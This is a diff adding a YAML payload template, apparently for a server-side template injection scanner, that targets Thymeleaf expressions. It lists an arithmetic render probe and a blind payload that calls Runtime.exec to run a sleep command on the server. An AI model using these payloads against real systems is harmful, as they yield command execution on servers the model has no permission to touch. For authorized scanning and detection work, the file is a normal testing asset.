@@ -1,0 +1,15 @@
+name: Thymeleaf
+contexts:
+  - begin: "${"
+    end: "}"
+    level: 1
+  - begin: "[[${"
+    end: "}]]"
+    level: 1
+attack_techniques:
+  - technique: "Render"
+    payloads:
+      - "{{.FirstNum}}*{{.SecondNum}}"
+  - technique: "Blind Exec Sleep"
+    payloads:
+      - '#rt = @java.lang.Runtime@getRuntime(),#rt.exec("sleep {{.WaitTime}}").waitFor()'
